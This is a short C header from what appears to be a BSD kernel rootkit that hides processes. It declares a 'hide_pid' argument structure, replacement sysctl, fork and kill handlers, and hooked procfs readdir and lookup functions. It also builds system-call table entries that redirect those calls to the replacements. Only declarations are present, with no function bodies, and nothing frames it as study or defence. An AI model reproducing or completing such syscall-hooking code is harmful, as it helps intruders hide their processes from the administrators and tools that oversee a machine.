
#ifndef _PROCESS_H
#define _PROCESS_H

#include "vnode.h"
#include <miscfs/procfs/procfs.h>
#include <sys/dirent.h>


/* arguments for hide_pid */
struct hide_process_args {
        pid_t pid;
};

extern int new_sysctl(struct proc *, struct sysctl_args *);
extern int new_fork(struct proc *, struct fork_args *);
extern int new_kill(struct proc *, struct kill_args *);

extern int new_procfs_readdir(struct vop_readdir_args *);
extern int new_procfs_lookup(struct vop_lookup_args *);

static struct sysent new_sysctl_sysent = {
        6,
        (sy_call_t *)new_sysctl
};

static struct sysent new_fork_sysent = {
        0,
        (sy_call_t  *)new_fork
};

static struct sysent new_kill_sysent = {
        2,
        (sy_call_t *)new_kill
};

#endif /* _PROCESS_H */

